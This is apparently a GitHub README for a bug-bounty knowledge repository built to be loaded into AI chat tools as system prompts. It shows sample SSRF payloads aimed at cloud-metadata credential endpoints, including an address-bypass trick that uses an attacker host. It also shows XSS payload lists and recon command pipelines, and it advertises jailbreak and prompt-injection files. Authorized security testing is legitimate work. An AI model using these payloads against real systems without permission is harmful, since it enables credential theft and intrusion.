# BugBountySkills

> **615 markdown files. ~76,000 lines.**
> Load into any LLM → your AI becomes an elite bug bounty partner.
> Use without AI → the most complete hunting knowledge vault you own.


---

## The Problem

Most "AI for hacking" setups give you a general-purpose chatbot wearing a hacker costume.
Ask it about SSRF and you get a Wikipedia summary.
Ask it for payloads and you get a placeholder.
Ask it to help you build a recon pipeline and you get pseudocode.

This repo fixes that.

---

## What Happens When You Load This

**Before:** "explain ssrf to me"
→ Generic definition, maybe one payload, no context awareness

**After:** `SSRF MODE — target is internal AWS service, WAF is Cloudflare`
→ IMDS endpoint list, cloud-metadata bypass wordlist, Cloudflare bypass techniques,
   impact chain (SSRF → metadata → IAM keys → privilege escalation), H1 report template

---

**Before:** "help me do recon on example.com"
→ "You can use subfinder or amass..."

**After:** `RECON MODE — *.example.com, recently added to H1 program, VDP`
→ Copy-paste subfinder | httpx | katana | nuclei pipeline,
   JS endpoint extraction command, wayback mining one-liner,
   GitHub dork list for the domain, Shodan/Censys query,
   prioritized attack surface map

---

**Before:** "write a bug report for an IDOR"
→ Generic template with [FILL IN HERE] everywhere

**After:** `REPORT MODE — IDOR on /api/v2/users/:id/invoices, accessed other users' billing data`
→ H1-formatted report with correct severity (CVSS calculated),
   step-by-step reproduction, impact statement, remediation advice,
   all ready to submit

---

## What's Inside

| Section | Files | Coverage |
|---|---|---|
| `MASTER_SYSTEM_PROMPTS/` | 4 | Drop-in prompts for Claude · ChatGPT · Copilot · local models |
| `SKILL_FILES/RECON/` | 16 | Passive recon → subdomain enum → DNS → JS analysis → cloud recon → full automation pipeline |
| `SKILL_FILES/VULNERABILITIES/WEB/` | 41 | XSS · SQLi · SSRF · SSTI · XXE · RCE · LFI · IDOR · Auth bypass · JWT · OAuth · SAML · Race conditions · HTTP smuggling · Cache poisoning · WAF bypass · 20+ more |
| `SKILL_FILES/VULNERABILITIES/API/` | 9 | REST · GraphQL · gRPC · mass assignment · auth/authz attacks · fuzzing methodology |
| `SKILL_FILES/VULNERABILITIES/LLM_AI/` | 10 | Prompt injection · jailbreaks · RAG poisoning · plugin abuse · model extraction · LLM DoS |
| `SKILL_FILES/VULNERABILITIES/MOBILE/` | 11 | Android static/dynamic · deep links · WebView · iOS · cert pinning bypass |
| `SKILL_FILES/VULNERABILITIES/INFRA/` | 7 | AWS/GCP/Azure misconfig · S3 · Kubernetes · Docker |
| `SKILL_FILES/SOURCE_CODE_REVIEW/` | 16 | Python · JS · Java/Spring · PHP · Ruby/Rails · Go · Rust · .NET · C++ · Solidity · secrets detection · IaC · CI/CD |
| `SKILL_FILES/PAYLOADS/` | 15 | XSS · SQLi · SSRF · SSTI · XXE · RCE · LFI · JWT · WAF bypass · polyglots · prototype pollution · deserialization · prompt injection |
| `SKILL_FILES/AUTOMATION/` | 12 | Program monitoring · scope monitoring · asset monitoring · recon pipelines · Nuclei templates · Burp automation · Telegram/Discord alerts |
| `SKILL_FILES/REPORTING/` | 10 | H1 · Bugcrowd · Intigriti · email disclosure · severity/CVSS · impact statements · escalation templates |
| `SKILL_FILES/EXPLOIT_DEVELOPMENT/` | 5 | PoC writing · exploit chaining · impact amplification · mitigation bypass · zero-day research |
| `KNOWLEDGE_BASE/` | 383 | One deep-dive file per micro-topic |
| `CHECKLISTS/` | 51 | Per-vuln-class + per-recon-stage operational checklists |

---

## Sample Content

<details>
<summary>📄 Sample: <code>SKILL_FILES/VULNERABILITIES/WEB/ssrf_all_types.md</code> (excerpt)</summary>

````markdown
# SKILL: Server-Side Request Forgery (SSRF — Basic / Blind / DNS Rebinding / GopherProtoSmuggling)

## IDENTITY IN THIS SKILL
SSRF gets you cloud metadata (AWS IMDS, GCP, Azure), internal services, port scan
from inside the perimeter, and sometimes RCE via Redis/Memcached/Elasticsearch.
I always test cloud metadata first, then internal port scan, then protocol smuggling.

## DETECTION
- Any param taking a URL: `?url=`, `?image=`, `?webhook=`, `?fetch=`, `?proxy=`,
  `?next=`, `?ref=`, file uploads with URL fetcher, HTML→PDF, SSO callbacks.
- Send Burp Collaborator URL — observe DNS / HTTP hit. Out-of-band confirms SSRF.

## EXPLOITATION
### Cloud metadata (always start here)
```
http://169.254.169.254/latest/meta-data/                          # AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/ # then .../<role-name>
http://[fd00:ec2::254]/latest/meta-data/                          # IMDS over IPv6
http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json
http://169.254.169.254/metadata/instance?api-version=2021-02-01   # Azure
http://100.100.100.200/latest/meta-data/                          # Alibaba
http://169.254.169.254/v1.json                                    # DigitalOcean
http://169.254.169.254/opc/v1/instance/                           # Oracle
```

### IMDSv2 (header required)
```
PUT /latest/api/token    HEADER X-aws-ec2-metadata-token-ttl-seconds: 21600
GET /latest/meta-data/   HEADER X-aws-ec2-metadata-token: <token>
```

## PAYLOADS — IP encoding bypasses
```
http://127.1
http://0177.0.0.1            # octal
http://2130706433            # decimal
http://0x7f.0.0.1            # hex
http://[::ffff:127.0.0.1]
http://attacker.tld@127.0.0.1   # auth-section trick
http://allowedhost.com@attacker.tld
```

→ Full file: 185 lines including DNS rebinding, gopher Redis RCE chains,
  WAF bypasses, and chain-aware impact escalation.
````

[→ See full file](SKILL_FILES/VULNERABILITIES/WEB/ssrf_all_types.md)

</details>

<details>
<summary>📄 Sample: <code>SKILL_FILES/RECON/02_subdomain_enumeration.md</code> (excerpt)</summary>

````markdown
# SKILL: Subdomain Enumeration (Active + Permutation)

## DECISION TREE
- Seed list ≥ 200? → **Skip brute-force**, go straight to permutation.
- Seed list < 50? → Pure brute force first with `puredns` + commonspeak2 + n0kovo big list.

## A. Seed Aggregation
```bash
cat ct_subs.txt subfinder.txt amass.txt assetfinder.txt chaos.txt gh_subs.txt \
  | sed 's/^\*\.//; s/\.$//' \
  | grep -E "^[a-zA-Z0-9._-]+\.example\.com$" \
  | tr '[:upper:]' '[:lower:]' \
  | sort -u > seed.txt
```

## B. Permutation Generation
```bash
alterx -l seed.txt -enrich -o permutations.txt
gotator -sub seed.txt -perm permutations.txt -depth 1 -numbers 5 -mindup -adv -md > altered.txt
ripgen -d seed.txt > rip.txt
cat permutations.txt altered.txt rip.txt | sort -u > all_perm.txt
```

## C. Mass DNS Resolution
```bash
wget -q https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt -O resolvers.txt
puredns resolve all_perm.txt \
  --resolvers resolvers.txt \
  --rate-limit 5000 \
  --wildcard-tests 30 \
  --wildcard-batch 1500000 \
  --write resolved.txt
```

→ Full file: 173 lines including wildcard handling, takeover detection,
  TLS-cert mining, and a complete one-liner pipeline.
````

[→ See full file](SKILL_FILES/RECON/02_subdomain_enumeration.md)

</details>

<details>
<summary>📄 Sample: <code>SKILL_FILES/PAYLOADS/xss_payloads_all_contexts.md</code> (excerpt)</summary>

````markdown
# PAYLOADS: XSS — All Contexts

## HTML BODY
```
<script>alert(document.domain)</script>
<svg/onload=alert(document.domain)>
<img src=x onerror=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<math><mtext><table><mglyph><svg><mtext><textarea><a title="</textarea><img src onerror=alert(1)>">
```

## ATTRIBUTE — DOUBLE QUOTED
```
" autofocus onfocus=alert(document.domain) x="
"><svg/onload=alert(document.domain)>
```

## JS STRING — SINGLE QUOTED
```
';alert(document.domain);//
\\';alert(document.domain);//
```

## JSON IN <script>
```
"</script><svg/onload=alert(document.domain)>"
"\u003c/script>\u003csvg/onload=alert(document.domain)>"
```

## URL / HREF
```
javascript:alert(document.domain)
JaVaScRiPt:alert(document.domain)
java%0ascript:alert(document.domain)
data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
```

→ Full file: 148 lines covering 12 distinct injection contexts including SVG, CSS,
  filter-bypass tag variations, and polyglot payloads.
````

[→ See full file](SKILL_FILES/PAYLOADS/xss_payloads_all_contexts.md)

</details>

---

## Quick Start

### 1. Clone

```bash
git clone https://github.com/0xN0RMXL/BugBountySkills.git
```

### 2. Load into Claude (recommended)

1. [claude.ai](https://claude.ai) → Projects → New project → name: `Bug Bounty Oracle`
2. Project instructions → paste [`MASTER_SYSTEM_PROMPTS/claude_master_system_prompt.md`](MASTER_SYSTEM_PROMPTS/claude_master_system_prompt.md)
3. Project knowledge → upload files from `SKILL_FILES/` and `KNOWLEDGE_BASE/`
4. Start hunting

### 3. Load into ChatGPT

1. [chatgpt.com/gpts/editor](https://chatgpt.com/gpts/editor) → Create
2. Instructions → paste [`MASTER_SYSTEM_PROMPTS/chatgpt_master_system_prompt.md`](MASTER_SYSTEM_PROMPTS/chatgpt_master_system_prompt.md)
3. Knowledge → upload markdown files

### 4. Load into GitHub Copilot

```bash
cp MASTER_SYSTEM_PROMPTS/github_copilot_instructions.md YOUR_REPO/.github/copilot-instructions.md
```

### 5. Use without AI (Obsidian vault)

```bash
obsidian --vault $PWD
# or just:
rg "ssrf" KNOWLEDGE_BASE/
```

---

## Skill Activation Triggers

| Type in chat | AI loads |
|---|---|
| `RECON MODE` | All 16 recon skill files |
| `WEB MODE` | All 41 web vuln skill files |
| `API MODE` | All 9 API attack skill files |
| `LLM MODE` | All 10 LLM/AI attack skill files |
| `MOBILE MODE` | All 11 mobile skill files |
| `SCR MODE` | All 16 source code review skill files |
| `PAYLOAD <class>` | Payload sheet for that vuln class |
| `EXPLOIT MODE` | PoC writing + exploit chaining skill files |
| `REPORT MODE` | Full reporting methodology + platform templates |
| `H1 MODE / BC MODE / INTI MODE` | Platform-specific tactics |

---

## Who This Is For

- Bug bounty hunters on HackerOne · Bugcrowd · Intigriti · YesWeHack · Immunefi
- Penetration testers doing web / API / mobile / cloud / source-code engagements
- Security researchers doing variant analysis and vuln research
- Red teamers building offensive playbooks
- AppSec engineers stress-testing their own products

Not for script kiddies. Not for unauthorized testing.
Everything here assumes you have explicit written scope.

---

## Tool Stack

<details>
<summary>Full tool list assumed by skill files</summary>

```
Recon:     subfinder · amass · assetfinder · chaos · httpx · dnsx · naabu
           masscan · nmap · katana · hakrawler · gau · waybackurls
           gowitness · ffuf · feroxbuster · arjun · paramspider · x8

Scanning:  nuclei · dalfox · sqlmap · kxss · gf · qsreplace · anew · notify

Web:       Burp Suite Pro + Param Miner · Turbo Intruder · DOM Invader
           HTTP Request Smuggler · Autorize · JWT Editor

Mobile:    jadx · apktool · frida · objection · MobSF

Cloud:     aws-cli · gcloud · az · cloud_enum · ScoutSuite · prowler

SCR:       semgrep · codeql · trufflehog · gitleaks

LLM:       garak · promptfoo

Web3:      foundry · slither · mythril · echidna
```

</details>

---

## Contributing

This repo grows with the community. PRs welcome for:
- New techniques with source references
- Updated payloads / bypass methods
- New tool integrations
- Bug fixes in commands or one-liners
- New KB entries for emerging vuln classes

See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

---

## References

This system synthesizes knowledge from:

- **PortSwigger Web Security Academy** — labs and research blog
- **HackerOne Hacktivity** — top P1 disclosed reports
- **Bugcrowd VRT** + **PayloadsAllTheThings**
- **The Web Application Hacker's Handbook** — Stuttard / Pinto
- **Bug Bounty Bootcamp** — Vickie Li
- **The Tangled Web** — Michal Zalewski
- **JavaScript for Hackers** — Gareth Heyes
- **Black Hat Python** — Justin Seitz
- **zseano's methodology**, **jhaddix Bug Hunter's Methodology Day 1 + 2**
- **NahamSec / Stök / IppSec / LiveOverflow** content
- **Trail of Bits / Doyensec / NCC Group** research
- **OWASP Cheat Sheet Series** + Testing Guide

Each skill file lists its specific references at the bottom.

---

## Disclaimer

For use against systems you have **explicit written authorization** to test.
Unauthorized testing is illegal. Hunt ethically. Stay in scope.

---

Maintained by [@0xN0RMXL](https://github.com/0xN0RMXL)
